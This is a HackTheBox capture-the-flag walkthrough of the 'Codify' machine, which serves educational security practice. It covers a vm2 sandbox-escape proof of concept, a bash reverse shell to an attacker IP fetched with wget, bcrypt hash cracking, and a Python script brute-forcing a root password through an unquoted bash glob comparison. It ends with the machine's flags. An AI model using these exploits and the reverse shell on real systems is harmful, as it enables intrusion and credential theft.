---
slug: codify
hide:
    - navigation
tags:
    - HackTheBox
    - Writeups
    - Walkthrough
    - Linux
    - Web
    - Node.js
    - Mysql
    - RCE
---

[:octicons-arrow-left-24: Back to HackTheBox Writeups](./index.md){ .sm-button }

# **Codify**

![](https://live.staticflickr.com/65535/53504550488_abf6366366_c.jpg){loading=lazy}

??? info "Information"
    **Machine**: [Codify](https://app.hackthebox.com/machines/574)  
    **Level**: `Easy`  
    **Tags**: `Linux`, `Web`, `JavaScript`, `Node.js`, `Mysql`, `RCE`  
    **Pwn**: [Pwned by 0xrh0d4m1n](https://www.hackthebox.com/achievement/machine/1013077/574)

---

## 🚀 **Starting**

```bash
echo '10.10.11.239 codify.htb' | sudo tee -a /etc/hosts
```

---

## 🔭 **Reconnaissance**

Starting with Nmap
```bash
nmap -sV -sC -T4 -A -O -f -Pn --top-ports 1000 -oN top1k.nmap 10.10.11.239
```

Through the Nmap results, we can see there is a `Apache httpd 2.4.52` running on port `80`, also it is possible to identify `Node.js Express framework` running at `3000`. Another interesting point it is the fact that it is running the famous `9001` wich is a port used by the project Tor.
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-26 07:00 EST
Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.19s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http        Apache httpd 2.4.52
|_http-title: Codify
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http        Node.js Express framework
|_http-title: Codify
9001/tcp open  tor-orport?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/26%OT=22%CT=1%CU=30227%PV=Y%DS=2%DC=T%G=Y%TM=658
OS:AC096%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=101%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GCD=1%ISR=107%TI
OS:=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M
OS:53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE8
OS:8%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
OS:)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   191.69 ms 10.10.14.1
2   197.48 ms codify.htb (10.10.11.239)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.09 seconds
```

Looking through the browser to get a better visualization about the website being served on `80` we get the following screen:  
![](https://live.staticflickr.com/65535/53504842167_154b8d24f1_o.png){.maxH300}

On the About page, we have a brief description about the project. In other words, they described their application as an editor where is possible to "run your JavaScript code directly in the browser" with the purpose of testing or debugging Node.js code. This were possible by the use of a library known as "vm2", which was discontinued. Also, it is possible to identify a link to vm2 library Github repository.  
![](https://live.staticflickr.com/65535/53506150095_d86d20d6f5_o.png){.maxH300}

VM2 Sandbox Library Description  
![](https://live.staticflickr.com/65535/53504842147_1656fef329_o.png){.maxH300}

In fact, it is running JavaScript (Node.js)  
![](https://live.staticflickr.com/65535/53506039284_48e372e2a2_o.png){.maxH300}

---

## 🪲 **Vulnerability Scan**

The VM2 project was discontinued, I was reading why and I discovered that was due the fact that this is vulnerable to RCE.

Then, I found this PoC exposing the problem:

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```

### **Code Analysis**

As host exceptions may leak host objects into the sandbox, code is preprocessed with `transformer()` in order to instrument the code with `handleException()` sanitizer function calls.

For `CatchClause` with `ObjectPattern` the code calls `handleException()` and then re-throws the sanitized exception inside a **nested try-catch**. ([lib/transformer.js:121](https://github.com/patriksimek/vm2/blob/3.9.16/lib/transformer.js#L121))

`handleException()` function is an alias of `thisEnsureThis()`, which in turn calls `thisReflectGetPrototypeOf(other)` (again, an alias of `Reflect.getPrototypeOf()`) to access the object's prototype ([lib/bridge.js:835](https://github.com/patriksimek/vm2/blob/3.9.16/lib/bridge.js#L835)).

However, this may be proxied through a `getPrototypeOf()` proxy handler which can by itself throw an unsanitized host exception, resulting in the outer catch statement receiving it.

An attacker may use any method to raise a non-proxied host exception ([test/vm.js:1082](https://github.com/patriksimek/vm2/blob/3.9.16/test/vm.js#L1082) for example) inside a `getPrototypeOf()` proxy handler, register it to an object and throw it to leak host exception, and finally use it to access host `Function`, escaping the ~~sandbox~~.


### **Impact**

**Remote Code Execution**, assuming the attacker has arbitrary code execution primitive inside the context of vm2 sandbox.


*Credits: [Xion](https://twitter.com/0x10n)*

Let's execute the PoC  
![](https://live.staticflickr.com/65535/53505728296_d306a5358f_o.png){.maxH300}

---

## 🎯 **Exploit**

Confirmed the PoC, it is time to exploit it, let's start searching bash directory  
![](https://live.staticflickr.com/65535/53505879663_dfcf6a339c_o.png){.maxH300}

Also checking if we have access to `wget`, so we can send stuff to the machine  
![](https://live.staticflickr.com/65535/53505728306_6194f9fb0b_o.png){.maxH300}

Preparing a basic Reverse Shell script on Attacker Machine
```bash
vim r.sh
cat r.sh
#!/usr/bin/bash
bash -i >& /dev/tcp/10.10.14.12/13337 0>&1
```

Serving Reverse Shell script from the Attacker Machine
```bash
python -m http.server 12345
Serving HTTP on 0.0.0.0 port 12345 (http://0.0.0.0:12345/) ...
```

Running `wget` to download the Reverse Shell from the Attacker Machine  
![](https://live.staticflickr.com/65535/53505728266_cce3a47dd2_o.png){.maxH300}

Checking script permissions  
![](https://live.staticflickr.com/65535/53506039244_a3e6ab6479_o.png){.maxH300}

Giving eXecution permission
![](https://live.staticflickr.com/65535/53506150060_90a41fc479_o.png){.maxH300}

Setting Netcat Listener on Attacker Machine
```bash
nc -lnvp 13337
listening on [any] 13337 ...
```

### **Initial Access**  

Running the Reverse Shell
![](https://live.staticflickr.com/65535/53506039234_551ed99589_o.png){.maxH300}

### **Listening on Netcat**
We got an access
```bash
nc -lnvp 13337
listening on [any] 13337 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.239] 47986
bash: cannot set terminal process group (1262): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$
```

### **Stabilizing Netcat**
```bash
svc@codify:~$ which bash
which bash
/usr/bin/bash

svc@codify:~$ python3 -c "import pty;pty.spawn('/usr/bin/bash');" && export TERM=xterm
python3 -c "import pty;pty.spawn('/usr/bin/bash');" && export TERM=xterm

svc@codify:~$ ^Z                              
zsh: suspended  nc -lnvp 13337

stty raw -echo; fg
[1]  + continued  nc -lnvp 13337

svc@codify:~$ test -t 0 && echo "Interactive Shell" || echo "Not Interactive Shell"
Interactive Shell
```

---

## 🏁 **Flag Exfiltration**

### **Lateral Movement**  

User Enumeration
```bash
svc@codify:~$ cat /etc/passwd | grep -vE 'nologin'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
pollinate:x:105:1::/var/cache/pollinate:/bin/false
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

After spending a good time sniffing through the system to find a vector to Lateral Movement, I found some useful files
```bash
svc@codify:~$ find / -name '*.db' -type f 2>/dev/null
/var/cache/man/index.db
/var/cache/man/zh_CN/index.db
/var/cache/man/de/index.db
/var/cache/man/pl/index.db
/var/cache/man/es/index.db
/var/cache/man/uk/index.db
/var/cache/man/ko/index.db
/var/cache/man/sr/index.db
/var/cache/man/fi/index.db
/var/cache/man/fr/index.db
/var/cache/man/da/index.db
/var/cache/man/tr/index.db
/var/cache/man/zh_TW/index.db
/var/cache/man/pt/index.db
/var/cache/man/hu/index.db
/var/cache/man/it/index.db
/var/cache/man/ro/index.db
/var/cache/man/nl/index.db
/var/cache/man/cs/index.db
/var/cache/man/sv/index.db
/var/cache/man/pt_BR/index.db
/var/cache/man/ru/index.db
/var/cache/man/id/index.db
/var/cache/man/ja/index.db
/var/cache/man/sl/index.db
/var/www/contact/tickets.db
/var/lib/plocate/plocate.db
/var/lib/fwupd/pending.db
/var/lib/PackageKit/transactions.db
/var/lib/command-not-found/commands.db
/usr/lib/firmware/regulatory.db
```

The dir `/var/www/contact/` stands out to me, so I verified `tickets.db` db file.
```bash
svc@codify:~$ file /var/www/contact/tickets.db
/var/www/contact/tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17

svc@codify:~$ strings /var/www/contact/tickets.db
SQLite format 3
otableticketstickets
CREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
	tableusersusers
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
    ))
indexsqlite_autoindex_users_1users
joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
joshua
users
tickets
Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open
Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
```

Great progress, a hash with an username `joshua` which is in our `/etc/passwd`, let's crack it
```bash
echo -n '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' | tee joshua.hash

john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt joshua.hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:42 0.01% (ETA: 2024-01-02 14:20) 0g/s 28.99p/s 28.99c/s 28.99C/s franklin..warren
spongebob1       (?)     
1g 0:00:00:47 DONE (2023-12-26 16:17) 0.02107g/s 28.83p/s 28.83c/s 28.83C/s crazy1..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I didn't want to execute all the road to this point, so, I just created a persistence to avoid problems *(Optional)*
```bash
svc@codify:~$ su joshua
Password:
joshua@codify:/home/svc$ ls -la ~/.ssh/
ls: cannot access '/home/joshua/.ssh/': No such file or directory
joshua@codify:/home/svc$ mkdir ~/.ssh && cd ~/.ssh
joshua@codify:~/.ssh$ vim authorized_keys
```

### **User Flag**
```bash
joshua@codify:~$ ll 
total 64
drwxrwx--- 5 joshua joshua 4096 Dec 26 21:20 ./
drwxr-xr-x 4 joshua joshua 4096 Sep 12 17:10 ../
lrwxrwxrwx 1 root   root      9 May 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 joshua joshua  220 Apr 21  2023 .bash_logout
-rw-r--r-- 1 joshua joshua 3771 Apr 21  2023 .bashrc
drwx------ 2 joshua joshua 4096 Sep 14 14:44 .cache/
drwx------ 3 joshua joshua 4096 Dec 26 02:53 .gnupg/
-rw------- 1 joshua joshua   20 Dec 26 03:44 .lesshst
-rw------- 1 joshua joshua 1246 Dec 26 04:08 .mysql_history
-rw-r--r-- 1 joshua joshua  807 Apr 21  2023 .profile
-rw-rw-r-- 1 joshua joshua 3287 Dec 26 04:03 raptor.c
-rw-rw-r-- 1 joshua joshua 5192 Dec 26 04:03 raptor.o
-rwxrwxr-x 1 joshua joshua   41 Dec 26 03:15 read*
drwxrwxr-x 2 joshua joshua 4096 Dec 26 21:22 .ssh/
-rw-r----- 1 root   joshua   33 Dec 25 22:13 user.txt
-rw-r--r-- 1 joshua joshua   39 Sep 14 14:45 .vimrc
joshua@codify:~$ cat user.txt
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

### **Root Flag**

Verifying `sudo` Capabilities, we can see a script:
```bash
joshua@codify:~$ sudo -l
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

Printing the `/opt/scripts/mysql-backup.sh` script, we have:
```bash
1	#!/bin/bash
2	DB_USER="root"
3	DB_PASS=$(/usr/bin/cat /root/.creds)
4	BACKUP_DIR="/var/backups/mysql"
5	
6	read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
7	/usr/bin/echo
8	
9	if [[ $DB_PASS == $USER_PASS ]]; then
10	        /usr/bin/echo "Password confirmed!"
11	else
12	        /usr/bin/echo "Password confirmation failed!"
13	        exit 1
14	fi
15	
16	/usr/bin/mkdir -p "$BACKUP_DIR"
17	
18	databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
19	
20	for db in $databases; do
21	    /usr/bin/echo "Backing up database: $db"
22	    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
23	done
24	
25	/usr/bin/echo "All databases backed up successfully!"
26	/usr/bin/echo "Changing the permissions"
27	/usr/bin/chown root:sys-adm "$BACKUP_DIR"
28	/usr/bin/chmod 774 -R "$BACKUP_DIR"
29	/usr/bin/echo 'Done!'
```

Here, the script reads the MySQL password from a file `/root/.creds` and stores it in the variable `DB_PASS`. Then, it prompts the user to enter a password and stores it in the variable `USER_PASS`. The vulnerability lies in the comparison of these two variables on line 9.

The comparison `if [[ $DB_PASS == $USER_PASS ]]; then` uses the equality operator `==` without any quoting or protection for the variables. This means that if the password contains special characters or wildcards, they could be interpreted by the shell, leading to unexpected behavior or potentially allowing an attacker to manipulate the comparison.

For example, if the password stored in `/root/.creds` contains a wildcard character such as "\*", it could match multiple characters when expanded by the shell, leading to an unintended comparison. This could potentially allow an attacker to bypass the password check. Here is a PoC:
```python
import string
import subprocess

all_characters = string.ascii_letters + string.digits
db_password = ""

while True:
    next_char = next(
        (
            char
            for char in all_characters
            if subprocess.run(
                f"echo '{db_password}{char}*' | sudo /opt/scripts/mysql-backup.sh",
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            ).stdout.count("Password confirmed!")
        ),
        None,
    )

    if next_char is None:
        break

    db_password += next_char
    print(f"[*] Cracking Password:{db_password}")

print("=" * 50)
print(f"[+] The Final Database Password is:{db_password}")
print("=" * 50)

```

Executing the PoC
```bash
joshua@codify:~$ python3 PoC.py
[*] Cracking Password:k
[*] Cracking Password:kl
[*] Cracking Password:klj
[*] Cracking Password:kljh
[*] Cracking Password:kljh1
[*] Cracking Password:kljh12
[*] Cracking Password:kljh12k
[*] Cracking Password:kljh12k3
[*] Cracking Password:kljh12k3j
[*] Cracking Password:kljh12k3jh
[*] Cracking Password:kljh12k3jha
[*] Cracking Password:kljh12k3jhas
[*] Cracking Password:kljh12k3jhask
[*] Cracking Password:kljh12k3jhaskj
[*] Cracking Password:kljh12k3jhaskjh
[*] Cracking Password:kljh12k3jhaskjh1
[*] Cracking Password:kljh12k3jhaskjh12
[*] Cracking Password:kljh12k3jhaskjh12k
[*] Cracking Password:kljh12k3jhaskjh12kj
[*] Cracking Password:kljh12k3jhaskjh12kjh
[*] Cracking Password:kljh12k3jhaskjh12kjh3
==================================================
[+] The Final Database Password is:kljh12k3jhaskjh12kjh3
==================================================
```

Switching to Root
```bash
joshua@codify:~$ su root
Password: 
root@codify:/home/joshua# ll /root
total 40
drwx------  5 root root 4096 Dec 25 22:13 ./
drwxr-xr-x 18 root root 4096 Oct 31 07:57 ../
lrwxrwxrwx  1 root root    9 Sep 14 03:26 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
-rw-r--r--  1 root root   22 May  8  2023 .creds
drwxr-xr-x  3 root root 4096 Sep 26 09:35 .local/
lrwxrwxrwx  1 root root    9 Sep 14 03:34 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Dec 25 22:13 root.txt
drwxr-xr-x  4 root root 4096 Sep 12 16:56 scripts/
drwx------  2 root root 4096 Sep 14 03:31 .ssh/
-rw-r--r--  1 root root   39 Sep 14 03:26 .vimrc
root@codify:/home/joshua# cat /root/root.txt
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

### Flag Codes
??? question "**Reveal Flags** 🏁"
    #### **User Flag**
        70fa07ee81ea506528dfaf1c14147f2b
    #### **Root Flag**
        45369447a9913630cfe14f4e2dd7495d

---

#### *If this was helpful in someway, [you can **support me** by zapping me some sats](https://getalby.com/p/0xrh0d4m1n)!*
#### *See you in the next writeup!*
